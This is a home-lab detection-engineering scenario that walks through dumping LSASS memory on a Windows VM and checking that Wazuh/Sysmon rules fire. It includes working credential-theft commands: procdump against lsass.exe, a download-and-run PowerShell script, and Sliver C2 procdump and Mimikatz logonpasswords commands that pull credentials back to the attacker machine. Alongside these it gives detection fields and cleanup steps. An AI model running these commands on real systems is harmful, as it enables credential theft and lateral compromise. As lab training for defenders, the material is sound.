# Scenario 02: Credential Access via LSASS Memory Dump

> **FOR AUTHORIZED HOME LAB USE ONLY**
> This scenario runs exclusively within the isolated UTM lab (192.168.64.0/24).

---

## Scenario Overview

| Field | Value |
|-------|-------|
| **Objective** | Dump credentials from LSASS memory on the Windows victim, triggering credential-access detections |
| **Threat Actor Profile** | Post-exploitation operator with local admin access (e.g., after phishing in Scenario 01) |
| **Duration** | ~20 minutes |
| **Complexity** | Intermediate |
| **MITRE Techniques** | T1003.001, T1059.001, T1027 |
| **Rules Exercised** | 100005, 100007, 100008 |
| **Prerequisites** | Administrator access on victim-windows; ideally an active Sliver C2 session from Scenario 01 |

---

## MITRE ATT&CK Coverage

| Phase | Technique | Sub-technique | Description |
|-------|-----------|---------------|-------------|
| Credential Access | T1003.001 | LSASS Memory | Direct memory read of lsass.exe |
| Execution | T1059.001 | PowerShell | ART test uses encoded PowerShell to invoke procdump |
| Defense Evasion | T1027 | Obfuscated Files | Encoded command hides intent |
| Credential Access | T1555 | Credentials from Password Stores | Credential parsing from the dump file |

---

## Prerequisites

- [ ] victim-windows VM running with Administrator PowerShell session
- [ ] Sysmon service running: `Get-Service Sysmon64a`
- [ ] Wazuh agent active: `Get-Service WazuhSvc`
- [ ] UTM snapshot taken before starting
- [ ] (Optional) Active Sliver session from Scenario 01 to run via C2

---

## Background: Why LSASS?

The Windows Local Security Authority Subsystem Service (`lsass.exe`) holds:
- NTLM hashes of recently logged-in users
- Kerberos tickets and session keys
- Plaintext credentials (in some configurations)

**Common tools that access LSASS:**
- Mimikatz (`sekurlsa::logonpasswords`)
- ProcDump (`procdump -ma lsass.exe`)
- Task Manager (if elevated) → "Create dump file"
- Sliver's built-in `procdump` or Mimikatz extension

**Detection trigger:** Sysmon EventID 10 (ProcessAccess) fires when a process opens a handle to `lsass.exe` with `PROCESS_VM_READ` access rights. This is what rule 100005 catches.

---

## Step-by-Step Execution

### Method A: Atomic Red Team (Recommended for Detection Validation)

```powershell
# [victim-windows — Administrator PowerShell]

# Step 1: Check prerequisites (downloads procdump64.exe from Sysinternals)
Invoke-AtomicTest T1003.001 -TestNumbers 1 -CheckPrereqs
Invoke-AtomicTest T1003.001 -TestNumbers 1 -GetPrereqs

# Step 2: Note start time for Kibana correlation
Write-Host "Test start: $([System.DateTime]::UtcNow.ToString('yyyy-MM-ddTHH:mm:ssZ'))"

# Step 3: Execute the test
# This runs: procdump64.exe -accepteula -ma lsass.exe C:\Temp\lsass.dmp
Invoke-AtomicTest T1003.001 -TestNumbers 1
```

**Observe on kali-attacker (watch Wazuh in real time):**

```bash
# [kali-attacker] Tail Wazuh alerts for LSASS events
ssh -i ~/.ssh/soc-lab soc@192.168.64.10 \
  "sudo tail -f /var/ossec/logs/alerts/alerts.json | python3 -m json.tool | grep -A5 '100005'"
```

### Method B: Direct via PowerShell (No ART)

```powershell
# [victim-windows — Administrator PowerShell]
# Downloads procdump directly and runs it

$procDumpUrl = "https://download.sysinternals.com/files/Procdump.zip"
$tempDir = "C:\Temp"
New-Item -ItemType Directory -Path $tempDir -Force | Out-Null

Invoke-WebRequest -Uri $procDumpUrl -OutFile "$tempDir\Procdump.zip"
Expand-Archive -Path "$tempDir\Procdump.zip" -DestinationPath "$tempDir\Procdump" -Force

# Get LSASS PID
$lssassPid = (Get-Process lsass).Id
Write-Host "LSASS PID: $lssassPid"

# Dump LSASS memory (triggers Sysmon EID 10 → Wazuh rule 100005)
& "$tempDir\Procdump\procdump64.exe" -accepteula -ma $lssassPid "$tempDir\lsass.dmp"
Write-Host "Dump created: $tempDir\lsass.dmp"
```

### Method C: Via Sliver C2 Session (Most Realistic)

```bash
# [kali — sliver session] (requires active session from Scenario 01)
sliver (SVCHOST_HELP) > ps
# Find LSASS PID from process list

sliver (SVCHOST_HELP) > procdump --pid [LSASS_PID] --save /tmp/lsass.dmp
# Transfers dump to kali — triggers Sysmon EID 10 on victim

# Alternative: use Mimikatz extension
sliver (SVCHOST_HELP) > mimikatz -- "privilege::debug sekurlsa::logonpasswords exit"
```

### Step 4: Verify the Dump Was Created

```powershell
# [victim-windows]
Test-Path "C:\Temp\lsass.dmp"    # Should be True
(Get-Item "C:\Temp\lsass.dmp").Length / 1MB  # Typically 50-150 MB
```

---

## Expected Wazuh Detections

**Kibana query:**
```
rule.id:100005 AND agent.name:"victim-windows"
```

| Alert | Rule ID | Level | Evidence Fields |
|-------|---------|-------|----------------|
| LSASS memory access detected | 100005 | **14** (Critical) | `win.eventdata.sourceImage`, `win.eventdata.grantedAccess` |
| Encoded PowerShell (if ART method) | 100007 | 12 | `win.eventdata.commandLine` contains `-enc` |

**Sysmon EID 10 fields to verify in Kibana:**

| Field | Expected Value |
|-------|---------------|
| `win.system.eventID` | `10` |
| `win.eventdata.targetImage` | `C:\Windows\system32\lsass.exe` |
| `win.eventdata.sourceImage` | `C:\Temp\Procdump\procdump64.exe` |
| `win.eventdata.grantedAccess` | `0x1fffff` (PROCESS_ALL_ACCESS) |

---

## Evidence to Capture

- [ ] Screenshot of Kibana alert showing rule 100005 at level 14
- [ ] Raw Sysmon event JSON showing `targetImage: lsass.exe` and `grantedAccess`
- [ ] Screenshot of `procdump` output on Windows confirming dump created
- [ ] (Optional) Screenshot of Mimikatz credential output in Sliver (for interview demo — blur any real creds)
- [ ] Note: timestamp of detection vs. timestamp of execution (measures SIEM response time)

---

## Cleanup

```powershell
# [victim-windows] Remove the LSASS dump and procdump tool
Invoke-AtomicTest T1003.001 -TestNumbers 1 -Cleanup
Remove-Item "C:\Temp\lsass.dmp" -Force -ErrorAction SilentlyContinue
Remove-Item "C:\Temp\Procdump.zip" -Force -ErrorAction SilentlyContinue
Remove-Item "C:\Temp\Procdump\" -Recurse -Force -ErrorAction SilentlyContinue

# Verify cleanup
Test-Path "C:\Temp\lsass.dmp"   # Should be False
```

**Restore VM snapshot** after the scenario to clear any residual Mimikatz artifacts.

---

## Lessons Learned

**For the interview narrative:**
- LSASS dumping is one of the most common post-exploitation steps — virtually every red team engagement includes it
- Sysmon's `ProcessAccess` event (EID 10) is the most reliable detection for this technique; Windows Event Logs alone don't capture this
- The `grantedAccess` mask `0x1fffff` (PROCESS_ALL_ACCESS) is a near-certain indicator; legitimate system processes use much lower access masks
- EDR products like CrowdStrike also detect this via kernel callbacks, but our Wazuh+Sysmon approach provides the same visibility at zero cost

**Detection gaps identified:**
- If an attacker uses `MiniDump` via a custom driver (kernel-level), Sysmon EID 10 may not fire — this is a known blind spot requiring EDR with kernel protection
- The allowlist for `WerFault.exe` must be maintained as Windows adds new processes that legitimately access LSASS
